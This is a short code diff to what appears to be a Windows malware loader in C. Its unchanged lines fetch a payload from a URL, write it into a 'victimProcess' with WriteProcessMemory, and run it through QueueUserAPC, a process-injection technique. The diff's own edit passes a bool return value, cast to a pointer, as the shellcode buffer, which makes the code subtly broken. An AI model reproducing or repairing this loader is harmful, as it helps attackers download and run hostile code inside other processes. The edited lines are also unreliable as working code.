@@ -132,7 +132,7 @@ int main() {
     PBYTE pPayloadBytes = NULL;
     SIZE_T sPayloadSize = NULL;
     
-    GetPayloadFromUrl(url, &pPayloadBytes, &sPayloadSize);
+    bool shellcode = GetPayloadFromUrl(url, &pPayloadBytes, &sPayloadSize);
     
     STARTUPINFOA si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
@@ -146,7 +146,7 @@ int main() {
 
     PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
     
-    WriteProcessMemory(victimProcess, shellAddress, pPayloadBytes, sPayloadSize, NULL);
+    WriteProcessMemory(victimProcess, shellAddress, (LPCVOID)shellcode, sPayloadSize, NULL);
 
     QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
 
